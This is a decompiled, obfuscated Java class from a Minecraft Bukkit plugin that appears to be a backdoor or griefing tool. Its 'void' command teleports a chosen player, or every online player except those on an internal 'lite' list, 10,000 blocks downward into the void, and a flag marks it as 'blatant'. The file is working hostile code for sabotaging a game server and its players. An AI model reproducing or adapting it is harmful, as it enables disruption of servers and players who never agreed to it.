/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class VoidCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public VoidCommand() {
        VoidCommand lllllllllllllllIllllIIllIlIIlllI;
    }

    @Override
    public void execute(Core lllllllllllllllIllllIIllIlIIIIIl, String lllllllllllllllIllllIIllIlIIIlII, String[] lllllllllllllllIllllIIllIlIIIIll, Player lllllllllllllllIllllIIllIlIIIIlI) {
        if (lllllllllllllllIllllIIllIlIIIIll.length <= 1) {
            lllllllllllllllIllllIIllIlIIIIlI.sendMessage(Settings.USAGE("void <player>"));
        } else if (lllllllllllllllIllllIIllIlIIIIll[1].equals("*")) {
            for (Player lllllllllllllllIllllIIllIlIIlIII : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllllIllllIIllIlIIIIIl.lite.contains(lllllllllllllllIllllIIllIlIIlIII.getName())) continue;
                lllllllllllllllIllllIIllIlIIIIIl.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllllIllllIIllIlIIIIIl, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)lllllllllllllllIllllIIllIlIIIIIl, () -> lllllllllllllllIllllIIllIlIIlIII.teleport(lllllllllllllllIllllIIllIlIIlIII.getLocation().subtract(0.0, 10000.0, 0.0))).get();
                    }
                    catch (InterruptedException | ExecutionException lllllllllllllllIllllIIllIIlIlIIl) {
                        // empty catch block
                    }
                });
            }
            lllllllllllllllIllllIIllIlIIIIlI.sendMessage(Settings.PREFIX("Everyone was sent to the void!"));
        } else {
            Player lllllllllllllllIllllIIllIlIIIlll = Bukkit.getServer().getPlayer(lllllllllllllllIllllIIllIlIIIIll[1]);
            if (lllllllllllllllIllllIIllIlIIIlll == null) {
                lllllllllllllllIllllIIllIlIIIIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllIllllIIllIlIIIIll[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                lllllllllllllllIllllIIllIlIIIIIl.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllllIllllIIllIlIIIIIl, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)lllllllllllllllIllllIIllIlIIIIIl, () -> lllllllllllllllIllllIIllIlIIIlll.teleport(lllllllllllllllIllllIIllIlIIIlll.getLocation().subtract(0.0, 10000.0, 0.0))).get();
                    }
                    catch (InterruptedException | ExecutionException lllllllllllllllIllllIIllIIllIlII) {
                        // empty catch block
                    }
                });
                lllllllllllllllIllllIIllIlIIIIlI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllIllllIIllIlIIIlll.getName()).append(Settings.WHITE).append(" was sent to the void!"))));
            }
        }
    }
}

